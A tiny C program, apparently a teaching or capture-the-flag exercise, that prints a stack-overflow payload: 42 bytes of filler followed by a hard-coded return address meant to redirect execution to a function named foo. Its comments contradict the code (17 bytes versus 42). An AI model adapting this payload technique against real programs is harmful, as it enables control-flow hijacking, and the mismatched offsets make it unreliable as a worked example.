#include <stdio.h>
#include <string.h>
int main(){
	char buf[200];
	//assume we need 17 bytes to reach return address
	strcpy(buf,"aaaaaaaaaabbbbbbbbbbccccccccccddddddddddee"); // 42 bytes
	//and we overwrite return address
	//with the address of foo
	buf[42]=0x9c;
	buf[43]=0x84;
	buf[44]=0x04;
	buf[45]=0x08;
	write(1, buf, 46); 
	//write to file number 1 which is the screen
	return 0;
}
